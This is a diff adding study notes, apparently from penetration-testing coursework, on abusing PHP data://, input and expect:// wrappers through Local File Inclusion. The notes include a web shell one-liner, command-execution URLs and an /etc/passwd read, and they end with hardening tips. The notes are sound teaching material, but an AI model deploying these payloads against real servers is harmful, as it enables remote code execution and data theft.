@@ -152,3 +152,77 @@ Example: `http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00`
 ---
 
 
+
+# PHP Wrappers
+
+## File Inclusion Vulnerabilities
+- File Inclusion vulnerabilities occur when an application includes files specified by the user without proper validation.
+- These vulnerabilities can:
+  - Disclose sensitive files.
+  - Allow attackers to execute malicious code or commands.
+- They are commonly found in misconfigured servers or poorly sanitized parameters.
+
+PHP Wrappers extend the functionality of PHP streams, allowing data to be treated like a file. They can be exploited in Local File Inclusion (LFI) vulnerabilities to execute code or commands remotely.
+
+### 1. **Data Wrapper**
+- **Purpose**: Includes external data, including PHP code.
+- **Requirement**: `allow_url_include = On` must be enabled in `php.ini`. This is **not enabled by default** but is sometimes used for compatibility with web applications like certain WordPress plugins.
+- **How It Works**:
+  - Encode PHP code (e.g., a web shell) in Base64 format.
+  - Use `data://text/plain;base64,` to decode and execute the PHP code.
+  - Example web shell:
+    ```php
+    <?php system($_GET["cmd"]); ?>
+    ```
+  - Encoded and included via:
+    ```
+    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_STRING>&cmd=<COMMAND>
+    ```
+  - Example command: `&cmd=id` (to display user and group information).
+
+
+
+### 2. **Input Wrapper**
+- **Purpose**: Accepts external input via POST requests to execute PHP code.
+- **Requirement**: `allow_url_include = On` must also be enabled.
+- **How It Works**:
+  - PHP code is sent in the POST data.
+  - Example payload:
+    ```
+    POST: <?php system($_GET["cmd"]); ?>
+    GET: ?cmd=id
+    ```
+  - Useful for situations where GET parameters are restricted.
+- **Notes**:
+  - If the vulnerable function only accepts POST requests, the command can be hardcoded into the PHP payload:
+    ```php
+    <?php system('id'); ?>
+    ```
+
+
+### 3. **Expect Wrapper**
+- **Purpose**: Executes system commands directly via URL streams.
+- **Requirement**: The `expect` extension must be installed and enabled on the server.
+- **How It Works**:
+  - The `expect://` stream wrapper directly executes system commands.
+  - Example command:
+    ```
+    http://<SERVER_IP>:<PORT>/index.php?language=expect://id
+    ```
+  - Result: Outputs information such as user ID, group ID, and group memberships.
+
+- **Checking for Installation**:
+  - Use LFI with a configuration file (e.g., `/etc/php/<VERSION>/apache2/php.ini`) to check for `extension=expect`.
+  - Example:
+    ```bash
+    $ echo '<BASE64_ENCODED_STRING>' | base64 -d | grep expect
+    ```
+
+## Key Points to Secure PHP Applications
+- **Disable `allow_url_include`**: Set it to `Off` in `php.ini`.
+- **Avoid Installing Unnecessary Extensions**: Do not install or enable modules like `expect` unless required.
+- **Limit File Inclusion Paths**: Use `open_basedir` to restrict PHP scripts to specific directories.
+- **Validate User Inputs**: Implement proper input validation and sanitization to prevent arbitrary file inclusion.
+
+
+---
